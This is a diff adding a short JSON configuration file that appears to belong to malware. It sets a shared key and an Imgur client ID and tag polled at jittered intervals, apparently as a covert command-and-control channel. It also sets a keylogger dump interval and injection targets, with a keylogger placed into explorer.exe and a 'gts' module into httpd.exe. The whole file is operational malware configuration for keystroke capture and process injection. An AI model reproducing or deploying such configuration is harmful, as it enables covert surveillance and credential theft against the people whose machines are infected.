@@ -1,0 +1,22 @@
+{
+    "shared_key": "0x982147b5bea3f6c2",
+    "imgur_client_id": "546c25a59c58ad7",
+    "imgur_tag": "png",
+    "imgur_tag_query_mins": 15,
+    "imgur_tag_query_mins_jitter": 1,
+    "keylogger_dump_mins": 10,
+    "injector": [
+        {
+            "type": "gts",
+            "targets": [
+                "httpd.exe"
+            ]
+        },
+        {
+            "type": "keylogger",
+            "targets": [
+                "explorer.exe"
+            ]
+        }
+    ]
+}
